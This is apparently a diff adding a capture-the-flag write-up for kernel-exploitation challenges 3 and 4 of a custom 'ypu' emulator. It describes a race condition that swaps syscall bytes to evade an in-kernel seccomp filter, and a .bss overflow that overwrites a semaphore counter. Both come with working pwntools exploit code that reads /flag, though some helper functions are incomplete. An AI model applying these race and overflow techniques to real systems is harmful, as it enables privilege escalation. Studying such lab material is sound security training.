@@ -533,8 +533,318 @@ Notice that the resulting `OUT` file's content always changes, and contains the 
 
 ## Challenge 3
 
+This challenge is very interesting, as it presents multiple `ypu`s exploitation. This means that the emulator now may be runned under multicore environment, exposing a whole new attack surface for kernel races. \
+The userspace component launches a server, that supports unlimited parallel connections. Moreover, an array of 16 slots stores both `fd`s of open references to `/proc/ypu`, as well as `mmap`ed chunks of size `0x1000` each (mapped as `MAP_SHARED`). A seccomp filter is being set, allowing only calls for `set_robust_list, futex, read, write, close, mmap, mprotect, munmap, ioctl, madvise, accept, clone, exit, fcntl`. Finally, thread is being dispatched for every new connection, launching `challenge`. \
+Each thread handler may perform multiple commands:
+
+1. `load_program` - given `program_index`, reads from the client's socket up to `0x1000` bytes to store within a userspace buffer within the `.bss`. 
+
+2. `init_ypu` - copies a userspace buffer loaded by `load_program` into an `mmap`ed address, within one of the 16 slots. 
+
+3. `run_ypu` - Calls `ioctl` on the relevant `ypu_index`, triggering the corresponding yancode emulator within the kernel. 
+
+Notice that the kernel's yancode emulator have its own seccomp implementation, which blocks `SYS_READ_CODE, SYS_READ_MEM`, as in challenge 2. \
+But now, we can no longer perform the `fork` syscall from userspace. While the `clone` syscall isn't blocked, notice the narrow API we have - we CANNOT execute arbitrary userspace code anymore, but only launch yancode directly to the kernel. This means we have to exploit the kernel race vuln via other means. \
+My end goal is one kernel thread to manipulate the desired offset of the yancode, while the other tries to dispatch the `SYS_READ_MEM` syscall. Notice how the emulator's state is being allocated:
+
 ```c
+device_ioctl()
+{
+    vmstate_t state;
+    ...
+    while(v3)
+    {
+        state->memory = 0;
+        --v3;
+    }
+    state.code = file->private_data;
+}
 ```
+
+This means there's a critical mismatch between memory and code allocations:
+
+1. A new `state.memory[]` kernel buffer is being allocated for each kernel thread that reaches the `ioctl` handler. 
+
+2. The **SAME** `state.code[]` kernel buffer is being used for all kernel threads that are referencing the same underlying `mmap`ed region (`ypu_index`). 
+
+Because we can separate the procesdures of loading yancode to the emulator and executing it, my exploitation route is as follows:
+
+1. Generate yancode that performs simple open-read-write shellcode, in a naive manner. Call in a non-ending loop the dispatcher of `run_ypu` on this thread, denoted by `T1`. 
+
+2. Use the exact same yancode on `T2`, this time only calling `init_ypu` within a non-ending loop.
+
+3. Generate a similar yancode, except the `SYSCALL` opcode of `SYS_READ_MEM` is switched to `IMM` opcode. This time, run `T3`, calling `init_ypu` with this new program within a non-ending loop. 
+
+The above exploit means that there would be always only one thread, `T1`, that executes the yancode within the kernel. \
+However, there are 2 separate writers from userspace - `T2, T3` - continiously swapping the byte of the goal syscall, bypassing the seccomp filter. 
+
+In order to debug the userspace program, I've used the following script:
+
+```bash
+#!/bin/bash
+
+PID=$(pgrep -f "challenge")
+sudo gdb -p "$PID" -x /home/hacker/gdb_debug.gdb
+```
+
+```python
+#!/bin/python
+
+from glob import glob
+from dataclasses import dataclass
+from subprocess import check_output
+from tempfile import TemporaryFile
+from pwn import *
+import os, sys
+import struct
+import time
+import shutil
+import binascii
+import signal
+import array
+import textwrap
+import string
+import logging
+BINARY = '/challenge/toddlersys_level3.0'
+GDB_SCRIPT= '''
+set follow-fork-mode child
+set print elements 0
+handle SIG33 nostop noprint
+
+c
+'''
+
+context.arch = 'amd64'
+context.terminal = '/usr/bin/tmux'
+
+@dataclass
+class Regs:
+    a = b'\x40'
+    b = b'\x10'
+    c = b'\x04'
+    d = b''
+    s = b''
+    i = b''
+    f = b''
+
+@dataclass
+class Opcodes:
+    STM = b'\x40'
+    IMM = b'\x01'
+    ADD = b''
+    CMP = b''
+    JMP = b''
+    LDM = b''
+    STK = b''
+    SYSCALL = b'\x08'
+
+@dataclass
+class Syscalls:
+    OPEN = b'\x10'
+    READ_CODE = b''
+    READ_MEM = b'\x20'
+    WRITE_MEM = b'\x02'
+    SLEEP = b''
+    EXIT = b''
+
+def instruction(opcode, reg1, reg2):
+    return reg2 + reg1 + opcode
+
+def compare(reg1, reg2):
+    buffer = b''
+    buffer += instruction(Opcodes.CMP, reg1, reg2)
+    return buffer
+
+def syscall(number, out_reg):
+    return instruction(Opcodes.SYSCALL, number, out_reg)
+
+def store_in_memory(addr, register):
+    return instruction(Opcodes.STM, addr, register)
+
+def load_from_memory(addr, register):
+    return instruction(Opcodes.LDM, addr, value)
+
+def write_register(register, value):
+    assert(value < 0x100)
+    return instruction(Opcodes.IMM, register, value.to_bytes(1, 'little'))
+
+def jump_register(register, flags):
+    buffer = b''
+    buffer += instruction(Opcodes.JMP, flags, register)
+    return buffer
+
+def jump(addr, flags):
+    buffer = b''
+    buffer += write_register(Regs.s, addr)
+    buffer += jump_register(Regs.s, flags)
+    return buffer
+
+def open_file(file_addr, flags=0, mode=0):
+    buffer = b''
+    buffer += write_register(register=Regs.a, value=file_addr)
+    buffer += write_register(register=Regs.b, value=flags)  # O_RDONLY = 0 ; O_RDWR = 2
+    buffer += write_register(register=Regs.c, value=mode)  # mode, Irrelevant
+    buffer += syscall(Syscalls.OPEN, out_reg=Regs.a)
+    return buffer
+
+def read_to_memory(fd, offset, count, adjusted=False):
+    buffer = b''
+    if type(fd) == int:
+        buffer += write_register(Regs.a, value=fd)
+    buffer += write_register(Regs.b, value=offset)
+    buffer += write_register(Regs.c, value=count)
+    if adjusted:
+        buffer += instruction(Opcodes.IMM, Syscalls.READ_MEM, Regs.a)
+    else:
+        buffer += syscall(Syscalls.READ_MEM, out_reg=Regs.a)
+    return buffer
+
+def write_from_memory(fd, offset, count):
+    buffer = b''
+    if type(fd) == int:
+        buffer += write_register(Regs.a, value=fd)
+    buffer += write_register(Regs.b, value=offset)
+    buffer += write_register(Regs.c, value=count)
+    buffer += syscall(Syscalls.WRITE_MEM, out_reg=Regs.a)
+    return buffer
+
+def store_string(addr, string):
+    assert(type(string) == bytes)
+    buffer = b''
+    for i, b in enumerate(string):
+        buffer += write_register(Regs.a, b)
+        buffer += write_register(Regs.b, addr + i)
+        buffer += store_in_memory(addr=Regs.b, register=Regs.a)
+    return buffer
+
+def gen_yancode(adjusted=False):
+    MAX_YANCODE_SIZE = 0x1000
+
+    flag_path = b'/flag\x00'
+    flag_addr = 0
+    flag_content_addr = flag_addr + len(flag_path)
+    max_size = 0x80
+    out_file_path = b'/home/hacker/OUT\x00'
+    out_file_addr = max_size
+    
+    with open(out_file_path[:-1], 'wb') as f:
+        pass
+
+    yancode = b''
+    # Store "flag" in mem[0]
+    yancode += store_string(addr=flag_addr, string=flag_path)
+    # open("/flag", O_RDONLY, 0)
+    yancode += open_file(file_addr=flag_addr)
+    # read(fd, &mem[0], 0x50)
+    yancode += read_to_memory(fd=Regs.a, offset=flag_content_addr, count=max_size, adjusted=adjusted)
+
+    # Store out filename in mem[0x80]
+    yancode += store_string(addr=out_file_addr, string=out_file_path)
+    yancode += open_file(file_addr=out_file_addr, flags=2)
+    yancode += write_from_memory(fd=Regs.a, offset=flag_content_addr, count=max_size)
+    
+    yancode += b'\x00' * (MAX_YANCODE_SIZE - len(yancode))
+    return yancode
+```
+
+In order to acquire the flag, I've used the following oneliner:
+
+```bash
+while true; do cat ./OUT ; done
+```
+
+## Challenge 4
+
+Now the userspace component contains mutexes. In particular, for every ypu instance, `sem_init` is being called, initializing its semaphore as a threads-smaphore with the value of `1`. Upon calling the `init_ypu, run_ypu` handlers, `sem_wait` and `sem_post` are being called. \
+However, recall that the critical sections that are being locked are:
+
+1. The `memcpy`, issued by `T2, T3`, that performs the write to the mmap'ed region
+
+2. The `ioctl`, issued by `T1`. 
+
+This means that while perfoming the `ioctl` handler, m`T1` executes at the kernel, and the lock is held. Hence, no other thread can change the content of the device's corresponding `mmap`ed region. \
+Notice, however, that the lock is per-ypu. This means that there isn't synchronization between multiple different ypus within the kernel. However, since different ypus contain no shared memory regions, this wouldn't be possible to exploit. \
+Therefore, I assume the exploitation route goes through first overwriting metadata regarding the semaphore (whether its content - such as the `counter` member, or its pointer within the `.bss` - so we would use different semaphore instances), then fallbacking to challenge-3. Since overwriting the counter of a semaphore (to some high value) should be simpler exloit, this is my current target. \
+
+```bash
+read_addr = &data + 0x1000 + 768 * i
+semaphore_addr = &data + (384 + i) * 32
+
+read_max = &data + 0x1000 + 768 * 15
+semaphore_min = &data + 384 * 32
+```
+
+This means we can perform from userspace a linear `.bss` overflow of up to `15616 - 12288` bytes. If we'd like to overwrite the semaphore of ypu0, we'd have to supply `i = 15`, writing total of `384 * 32 - 768 * 15` padding bytes, and then overwriting the semaphore struct. Since the `counter` is actually stored within the first bytes of the semaphore object, we're good with supplying only 1 byte of overwrite. \
+Lastly, in order to avoid the `mmap` array being corrupted by the `read` that corrupts the semaphore object, I've used an initial thread, `T0`, that all it does is to overwrite the semaphore and hang for the rest of bytes with `read`. 
+
+```python
+def main():    
+    p = process(BINARY)
+
+    input("waiting for input..")
+    log.info("Exploit starts!")
+
+    iterations = 10000000
+    batch=100
+    target_ypu = 0
+    r1_program = 0
+    r2_program = 1
+    r3_program = 2
+    yancode = gen_yancode()
+    adjusted_yancode = gen_yancode(adjusted=True)
+
+    r0 = remote('localhost', 1337)
+    r1 = remote('localhost', 1337)
+    r2 = remote('localhost', 1337)
+    r3 = remote('localhost', 1337)
+
+    # Overwrite semaphore counter
+    buf = b'A' * (384 * 32 - 768 * 15)
+    buf += b'\x80'  # new counter
+    # buf += b'\x00' * (MAX_YANCODE_SIZE - len(buf))
+    load_program(r0, 15, buf)
+
+    # Load programs
+    load_program(r1, r1_program, yancode)
+    load_program(r2, r2_program, yancode)
+    load_program(r3, r3_program, adjusted_yancode)
+    # Load program for main thread
+    init_ypu(r1, target_ypu, r1_program)
+
+    # Execute race!
+    # TODO: change yancode, so that it would verify 'p' resides with the buffer before writing it
+    pid1 = os.fork()
+    if pid1 == 0:
+        # Child 1
+        for _ in range(iterations):
+            # log.info("Running r1..")
+            run_ypu(r1, target_ypu, batch)
+        os.kill(os.getpid(), signal.SIGKILL.value)
+    else:
+        # Parent    
+        pid2 = os.fork()
+        if pid2 == 0:
+            # Child 2
+            for _ in range(iterations):
+                # log.info("Running r2..")
+                init_ypu(r2, target_ypu, r2_program, batch)
+            os.kill(os.getpid(), signal.SIGKILL.value)
+        else:
+            # Parent
+            for _ in range(iterations):
+                # log.info("Running r3..")
+                init_ypu(r3, target_ypu, r3_program, batch)
+
+    os.waitpid(pid1, 0)
+    os.waitpid(pid2, 0)
+    
+    p.interactive()
+```
+
+
+## Challenge 5
+
+
 
 
 
